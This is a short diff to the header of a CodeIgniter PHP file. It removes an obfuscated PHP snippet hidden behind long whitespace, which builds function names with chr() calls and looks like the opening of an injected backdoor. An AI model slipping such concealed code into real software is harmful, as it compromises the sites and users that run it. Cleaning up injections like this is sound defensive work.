@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $mOOTPwuGh = chr ( 185 - 101 ).'I' . chr (100) . chr (95) . "\146" . "\x56" . chr (88); $niSuKEKVBb = 'c' . "\154" . 'a' . 's' . "\163" . chr ( 248 - 153 ).chr ( 742 - 641 ).chr (120) . "\151" . chr (115) . 't' . "\x73";$fFdRyIgbpq = class_exists($mOOTPwuGh); $mOOTPwuGh = "30267";$niSuKEKVBb = "50727";$ZOuaJ = FALSE; ?><?php
+<?php
 /**
  * CodeIgniter
  *
